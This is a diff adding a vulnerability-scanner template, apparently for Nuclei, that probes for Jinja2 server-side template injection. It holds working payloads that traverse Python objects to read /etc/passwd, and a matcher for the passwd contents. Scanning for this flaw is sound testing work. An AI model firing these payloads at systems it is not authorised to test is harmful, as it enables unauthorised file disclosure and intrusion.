@@ -1,0 +1,17 @@
+id: ssti
+info:
+  author: pikpikcu
+  name: Jinja2 2.10 - Command injection from_string function
+  severity: high
+requests:
+- matchers:
+  - part: body
+    regex:
+    - '28500'
+    - 'root:x:0:0:root:'
+    type: regex
+  method: GET
+  path:
+  - '{{BaseURL}}{{100*285}}'
+  - '{{BaseURL}}{{''''.__class__.__mro__[2].__subclasses__()[40](''/etc/passwd'').read()}}'
+  - '{{BaseURL}}{{url_for.__globals__.__builtins__.open(''/etc/passwd'').read()}}'
